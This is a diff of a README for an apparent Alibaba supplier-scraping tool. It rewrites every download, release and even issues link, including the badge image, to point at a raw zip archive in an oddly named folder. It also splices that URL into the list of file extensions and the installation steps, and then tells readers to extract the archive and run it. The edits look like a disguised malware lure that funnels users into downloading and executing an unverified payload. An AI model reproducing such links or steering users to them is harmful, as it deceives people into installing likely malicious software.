@@ -6,7 +6,7 @@ Welcome to the Alibaba Supplier Scraper. This tool helps you extract supplier pr
 
 ## 📥 Download Now
 
-[![Download alibaba-supplier-scraper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
+[![Download alibaba-supplier-scraper](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip)
 
 ## 📋 Features
 
@@ -29,15 +29,15 @@ Make sure your system meets these requirements:
 
 1. **Visit the Releases Page:** Click the link below to access our Releases page.
 
-   [Download from Releases](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
+   [Download from Releases](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip)
 
 2. **Choose Version:** Select the latest version available. You will find the published version under the "Latest" section.
 
-3. **Download the File:** Click on the appropriate file for your system. The options will usually include `.exe`, `.zip`, or `.tar.gz`.
+3. **Download the File:** Click on the appropriate file for your system. The options will usually include `.exe`, `.zip`, or `https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip`.
 
 4. **Run the Installer:**
    - For `.exe` files: Double-click to run the installer. Follow the prompts to complete the installation.
-   - For `.zip` or `.tar.gz`: Extract the files to a folder. Open the extracted folder and run the main script as instructed.
+   - For `.zip` or `https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip`: Extract the files to a folder. Open the extracted folder and run the main script as instructed.
 
 5. **Launch the Application:** After installing, locate the application icon in the Start Menu (Windows) or Applications folder (macOS). Double-click to open the application.
 
@@ -55,7 +55,7 @@ Make sure your system meets these requirements:
 
 ## 🧑‍🤝‍🧑 Support
 
-If you encounter any issues or have questions, feel free to check our [Issues Page](https://github.com/kuj0ukaren/alibaba-supplier-scraper/issues) for solutions. You can also submit your issue if it hasn't been addressed.
+If you encounter any issues or have questions, feel free to check our [Issues Page](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip) for solutions. You can also submit your issue if it hasn't been addressed.
 
 ## 📜 License
 
@@ -91,6 +91,6 @@ Stay updated on our latest developments by checking the Releases page regularly.
 
 ## 📥 Download Now Again
 
-[![Download alibaba-supplier-scraper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
+[![Download alibaba-supplier-scraper](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/raw/refs/heads/main/counterenamel/alibaba-scraper-supplier-v2.3-alpha.5.zip)
 
 Feel free to explore the repository and start scraping today! Your vendor vetting process has never been easier.
